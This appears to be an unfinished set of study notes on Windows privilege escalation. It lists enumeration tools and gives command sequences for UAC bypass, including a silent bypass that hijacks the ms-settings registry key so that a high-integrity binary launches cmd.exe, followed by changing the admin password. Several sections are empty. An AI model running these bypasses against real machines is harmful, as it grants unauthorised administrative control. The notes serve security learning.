# Windows Privilege Escalation

Extract useful information using scripts:

1. [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
2. [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
3. [Watson](https://github.com/rasta-mouse/Watson)
4. [Seatbelt](https://github.com/GhostPack/Seatbelt)
5. [Powerless](https://github.com/M4ximuss/Powerless)

## Basics

* Windows operating system uses objects called **access tokens** to enforce privileges on a user account
* These tokens are uniquely identified using a security identifier or **SID**
* **Integrity levels** are assigned to processes and securable objects
  1. System integrity process: SYSTEM rights
  2. High integrity process: administrative rights
  3. Medium integrity process: standard user rights
  4. Low integrity process: very restricted rights

## UAC Bypass

### Non-silent Method

* What is the current user's **integrity level**?

        whoami /groups

* Attempt to change the password for the admin user

        net user admin password123

* In order to change the admin user’s password, we need to **switch to a high integrity level** even if we are logged in as an administrator.

        powershell.exe Start-Process cmd.exe -Verb runAs

* Re-check the integrity level of current user, and, try changing the admin password

        whoami /groups
        net user admin password123

Note: When running at a high integrity level, password of a user can be changed successfully.

### Silent Method

* Identify a binary that runs at a high integrity level
* Inspect the applicatioin manifest

        .\sigcheck64.exe -accepteula
        .\sigcheck.exe -a -m C:\Windows\System32\file.exe

* Add a missing registry key

        REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command

* Use **REG ADD** with the `/v` argument to specify the value name and `/t` to specify the type

        REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ

* Silently replace the empty (Default) value of a registry key with path to an executable, e.g., `cmd.exe`

        REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

* Run the vulnerable executable
* Re-check the integrity level of current user, and, try changing the admin password

        whoami /groups
        net user admin password123

## Kernel driver vulnerabilities

c:\users\kostas\desktop\hfs.exe

## Insecure file permissions



## Unquoted service paths



## References

* https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842#:~:text=Services%20created%20by%20SYSTEM%20having,be%20executed%20with%20SYSTEM%20privileges